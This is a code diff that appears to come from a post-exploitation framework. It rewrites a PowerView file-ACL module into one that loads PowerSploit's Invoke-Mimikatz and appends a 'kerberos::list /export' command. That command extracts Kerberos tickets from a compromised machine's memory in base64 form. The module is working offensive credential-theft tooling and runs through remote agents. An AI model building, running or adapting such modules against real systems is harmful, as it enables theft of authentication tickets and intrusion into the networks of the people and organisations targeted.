@@ -5,11 +5,12 @@ class Module:
     def __init__(self, mainMenu, params=[]):
 
         self.info = {
-            'Name': 'Get-PathAcl',
+            'Name': 'Invoke-Mimikatz extract kerberos tickets.',
 
-            'Author': ['@harmj0y'],
+            'Author': ['@JosephBialek', '@gentilkiwi'],
 
-            'Description': ("Enumerates the ACL for a given file path."),
+            'Description': ("Runs PowerSploit's Invoke-Mimikatz function "
+                            "to extract kerberos tickets from memory in base64-encoded form."),
 
             'Background' : True,
 
@@ -18,11 +19,12 @@ class Module:
             'NeedsAdmin' : False,
 
             'OpsecSafe' : True,
-            
+
             'MinPSVersion' : '2',
             
             'Comments': [
-                'https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/'
+                'http://clymb3r.wordpress.com/',
+                'http://blog.gentilkiwi.com'
             ]
         }
 
@@ -34,18 +36,13 @@ class Module:
                 'Description'   :   'Agent to run module on.',
                 'Required'      :   True,
                 'Value'         :   ''
-            },
-            'Path' : {
-                'Description'   :   'The local/remote (UNC) path to enumerate the ACLs for.',
-                'Required'      :   True,
-                'Value'         :   ''
             }
         }
 
         # save off a copy of the mainMenu object to access external functionality
         #   like listeners/agent handlers/etc.
         self.mainMenu = mainMenu
-
+        
         for param in params:
             # parameter format is [Name, Value]
             option, value = param
@@ -55,10 +52,8 @@ class Module:
 
     def generate(self):
         
-        moduleName = self.info["Name"]
-        
-        # read in the common powerview.ps1 module source code
-        moduleSource = self.mainMenu.installPath + "/data/module_source/situational_awareness/network/powerview.ps1"
+        # read in the common module source code
+        moduleSource = self.mainMenu.installPath + "/data/module_source/credentials/Invoke-Mimikatz.ps1"
 
         try:
             f = open(moduleSource, 'r')
@@ -69,20 +64,8 @@ class Module:
         moduleCode = f.read()
         f.close()
 
-        # get just the code needed for the specified function
-        script = helpers.generate_dynamic_powershell_script(moduleCode, moduleName)
+        script = moduleCode
 
-        script += moduleName + " "
-
-        for option,values in self.options.iteritems():
-            if option.lower() != "agent":
-                if values['Value'] and values['Value'] != '':
-                    if values['Value'].lower() == "true":
-                        # if we're just adding a switch
-                        script += " -" + str(option)
-                    else:
-                        script += " -" + str(option) + " " + str(values['Value']) 
-
-        script += ' | Out-String | %{$_ + \"`n\"};"`n'+str(moduleName)+' completed!"'
+        script += "Invoke-Mimikatz -Command '\"standard::base64\" \"kerberos::list /export\"'"
 
         return script
